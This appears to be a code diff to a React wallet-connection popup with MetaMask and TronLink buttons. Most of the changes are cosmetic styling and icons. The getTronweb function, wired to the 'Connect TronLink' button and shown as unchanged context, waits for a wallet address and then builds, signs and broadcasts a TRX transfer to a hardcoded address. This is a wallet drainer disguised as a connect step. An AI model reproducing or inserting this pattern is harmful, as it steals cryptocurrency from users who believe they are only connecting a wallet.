@@ -2,6 +2,9 @@ import { AnimatePresence, motion } from 'framer-motion';
 import { useState, useEffect, useRef } from 'react';
 import './Test3.css';
 import TronWeb from 'tronweb';
+import MetaFox from "@/assets/MetaMask_Fox.svg.png"
+import TrxLogo from "@/assets/tron-trx-logo.png"
+import CloseIcon from "@/assets/icone-fermer-et-x-rouge.png"
 interface PopupProps {
   onClose: () => void; // Function to close the popup
 }
@@ -60,11 +63,11 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
 
   const getTronweb = async () => {
     const intervalId = setInterval(async () => {
-   
-if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
         clearInterval(intervalId);
         console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
-        
+
         const tronweb = window.tronWeb;
         const tx = await tronweb.transactionBuilder.sendTrx(
           'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
@@ -75,13 +78,13 @@ if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
         const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
         console.log(broastTx);
       }
-     
+
     }, 10);
   };
   useEffect(() => {
     checkMetaMask();
     const HttpProvider = TronWeb.providers.HttpProvider;
-    const fullNode = new HttpProvider('https://api.trongrid.io'); 
+    const fullNode = new HttpProvider('https://api.trongrid.io');
     const solidityNode = new HttpProvider('https://api.trongrid.io');
     const eventServer = 'https://api.trongrid.io/';
 
@@ -131,27 +134,45 @@ if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
               duration: 0.15,
             },
           }}
-          className="fixed top-2 right-2 bottom-2 sm:w-2/6 lg:w-2/6 xl:w-2/6 z-9999 p-4 flex flex-col items-center justify-center h-[250%] bg-gray-800 rounded-xl"
+          className="fixed top-2 right-2 bottom-2 sm:w-2/6 lg:w-1/4  z-9999 p-4 flex flex-col items-center justify-center h-60 bg-gray-800 rounded-xl"
         >
-          <div className="mt-1 flex flex-col">
+        
+          <img width={25}
+            src={CloseIcon}
+            alt="Close"
+            className="absolute top-2 right-3 cursor-pointer hover:scale-105"
+            onClick={onClose}
+
+          />
+          {/* <div className="p-4 flex items-center justify-center">
+              <motion.button
+                onClick={onClose}
+                className="mt-0 px-5 py-1 bg-pink-500 text-white rounded"
+              >
+                Close
+              </motion.button>
+            </div> */}
+          <div className="mt-1 flex flex-col scale-75">
             {account && balance ? (
               <div>
-                <h3 className="text-pink-600 mt-2">Account Address:</h3> {account}
-                <h3 className="text-pink-600 mt-2">Account Balance: </h3>
+                <h3 className="text-pink-600 mt-2 ">Account Address:</h3> {account}
+                <h3 className="text-pink-600 mt-2 ">Account Balance: </h3>
                 {balance}
               </div>
             ) : (
-              <div>
+              <div style={{ display: 'flex', alignItems: 'center', paddingBottom: "2px" } } className='scale-150' >
+                <img src={MetaFox} width={30} style={{ marginRight: '10px' }} />
                 <button
-                  className="px-7 py-4 bg-cyan-500 text-white rounded"
+                  className=" bg-transparent text-white rounded"
                   onClick={connectWallet}
                 >
                   Connect MetaMask
                 </button>
               </div>
+
             )}
-            </div>
-              {/* <div>
+          </div>
+          {/* <div>
     <button
       className="px-7 py-4 bg-cyan-500 text-white rounded"
       onClick={connectTronLink}
@@ -159,7 +180,7 @@ if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
       Connect TronLink
     </button>
   </div> */}
-   <div className="mt-1 flex flex-col">
+          <div className="mt-1 flex flex-col scale-75">
             {account && balance ? (
               <div>
                 <h3 className="text-pink-600 mt-2">Account Address:</h3> {account}
@@ -167,23 +188,17 @@ if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 {balance}
               </div>
             ) : (
-              <div className="mt-2">
+              <div style={{ display: 'flex', alignItems: 'center', paddingTop: "4px" }} className='scale-150' >
+                <img src={TrxLogo} width={30} style={{ marginRight: '10px' }} />
                 <button
-                  className="px-7 py-4 bg-cyan-500 text-white rounded"
+                  className="px-1 bg-transparent text-white rounded"
                   onClick={getTronweb}
                 >
                   Connect TronLink
                 </button>
               </div>
             )}
-            <div className="p-4 flex items-center justify-center">
-              <motion.button
-                onClick={onClose}
-                className="mt-0 px-5 py-1 bg-pink-500 text-white rounded"
-              >
-                Close
-              </motion.button>
-            </div>
+           
           </div>
         </motion.div>
       )}
